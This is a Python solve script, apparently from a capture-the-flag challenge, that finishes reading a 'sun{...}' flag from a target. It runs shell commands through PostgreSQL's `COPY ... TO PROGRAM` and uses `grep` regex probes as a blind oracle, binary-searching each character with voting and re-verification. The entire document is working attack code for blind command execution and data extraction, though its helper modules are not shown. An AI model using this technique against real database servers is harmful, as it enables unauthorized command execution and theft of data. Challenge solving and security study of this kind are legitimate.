#!/usr/bin/env python
"""Finish reading the flag, resuming from a prefix already confirmed on the target.

Same channel as getflag.py (`COPY (SELECT 1) TO PROGRAM '<extract> | grep -qE "<pat>"'`), but
every accepted character is re-checked: after appending it, `^<prefix>` must still match and
`^<prefix>.` must be true (a character follows) unless the last one was `}`. A character that
fails verification is re-searched, so one flaky probe can no longer derail the rest of the
string -- that is what made getflag.py bail at position 9 even though the byte is `d`.
"""
import string
import sys

import extract as E
import getflag as G

CAND = "sun{}" + string.digits + string.ascii_lowercase + "_-.@!+~"


def probe(p):
    return G.probe(p)


def char_at(prefix):
    head = "^" + "".join(G.klass(c) for c in prefix)
    lo, hi = 0, len(CAND) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if G.vote(head + G.klass(CAND[lo:mid + 1]), 3):
            hi = mid
        else:
            lo = mid + 1
    if not G.vote(head + G.klass(CAND[lo]), 3):
        return None
    return CAND[lo]


def verify(prefix):
    """The prefix must still match, and either a `}` ended it or another char follows."""
    head = "^" + "".join(G.klass(c) for c in prefix)
    if not G.vote(head, 3):
        return False
    if prefix.endswith("}"):
        return not G.vote(head + ".", 3)
    return G.vote(head + ".", 3)


def run(prefix="", cap=140):
    print("[*] resuming from %r" % prefix, flush=True)
    while len(prefix) < cap:
        c = None
        for attempt in range(4):
            c = char_at(prefix)
            if c is None:
                print("   retry %d on position %d" % (attempt + 1, len(prefix) + 1), flush=True)
                continue
            if verify(prefix + c):
                break
            print("   verify failed for %r+%r, retrying" % (prefix, c), flush=True)
            c = None
        if c is None:
            print("[-] stuck at position %d" % (len(prefix) + 1))
            return prefix
        prefix += c
        print("   %-46s (%d calls)" % (prefix, E.CALL[0]), flush=True)
        if c == "}":
            return prefix
    return prefix


if __name__ == "__main__":
    start = sys.argv[1] if len(sys.argv) > 1 else ""
    v = run(start)
    print("[+] %s" % v, flush=True)
    if v.startswith("sun{") and v.endswith("}"):
        open("flag.txt", "w").write(v.strip() + "\n")
        print("[*] written to flag.txt", flush=True)
